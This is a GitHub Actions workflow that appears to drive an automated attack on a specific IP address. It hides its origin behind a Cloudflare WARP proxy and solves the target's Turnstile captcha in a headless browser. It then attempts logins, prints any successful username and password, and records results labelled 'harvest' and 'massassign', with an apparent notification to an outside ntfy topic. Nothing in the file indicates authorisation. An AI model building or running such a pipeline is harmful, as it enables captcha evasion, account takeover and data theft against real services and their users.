name: i74158warp80
on:
  workflow_dispatch:
    inputs:
      nt:
        description: "ntfy topic"
        required: false
        default: "i74158warpx"
permissions:
  contents: read
jobs:
  warp:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - name: runner identity
        run: |
          echo "=== runner ==="; id -u; uname -r
          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/PRE_EGRESS_IP=/'

      - name: install + register Cloudflare WARP (proxy mode)
        run: |
          bash setup_warp.sh 2>&1 | tee warp_setup.log
          cat warp_method.env 2>/dev/null || true

      - name: install browser deps
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq xvfb >/dev/null 2>&1 || true
          python3 -m pip install --quiet --upgrade pip
          python3 -m pip install --quiet playwright "httpx[socks]"
          python3 -m playwright install --with-deps chromium 2>&1 | tail -2
          (google-chrome --version || chromium --version || echo no-system-chrome) 2>&1 | head -2

      - name: solve + login probe .80
        env:
          NT: ${{ github.event.inputs.nt }}
          TARGET: "http://40.160.50.80:3000"
          SITEKEY: "0x4AAAAAAGA1XSFhsC_wKQEx"
        run: |
          set -o pipefail
          SRC=$(grep -q "warp-cli-proxy" warp_method.env 2>/dev/null && echo socks5://127.0.0.1:40000 || echo "")
          echo "PROXY_SOURCE=$SRC"
          PROXY="$SRC" BUDGET=240 NT="$NT" TARGET="$TARGET" SITEKEY="$SITEKEY" \
            xvfb-run -a --server-args="-screen 0 1280x900x24" python3 warp_probe80.py 2>&1 | tee probe80.log | tail -150 || true

      - name: summarize
        if: always()
        run: |
          python3 - <<'EOF'
          import json
          try:
              d=json.load(open('results_probe80.json'))
          except Exception as e:
              print('no results', e); raise SystemExit
          print('target', d.get('target'), 'sitekey', d.get('sitekey'))
          for r in d.get('conn_timeline',[]): print(json.dumps(r)[:300])
          s=d.get('solve',{})
          print('== solve ==','token_len',s.get('token_len'),'clicked',len(s.get('clicks') or []),'err',s.get('err'))
          print('page_log', s.get('page_log'))
          if d.get('token_full'): print('TOKEN_FULL_LEN', len(d['token_full']))
          for a in d.get('attempts',[]): print('LOGIN',a['u'],a['status'],a['body'][:200])
          if d.get('login'): print('LOGIN_SUCCESS',d['login']['username'],'pass=',d['login']['password'],'setc=',d['login'].get('setc'))
          for k,v in (d.get('harvest') or {}).items(): print('HARVEST',k,v.get('status'),str(v.get('body'))[:300])
          for k,v in (d.get('massassign') or {}).items(): print('MASSASSIGN',k,v.get('status'),str(v.get('body'))[:300])
          EOF
          echo "--- warp method ---"; cat warp_method.env 2>/dev/null

      - name: upload diagnostics
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: diag74158
          path: |
            results_probe80.json
            probe80.log
            warp_setup.log
            warp_method.env
            last_probe80.html
            last_probe80.png
          if-no-files-found: ignore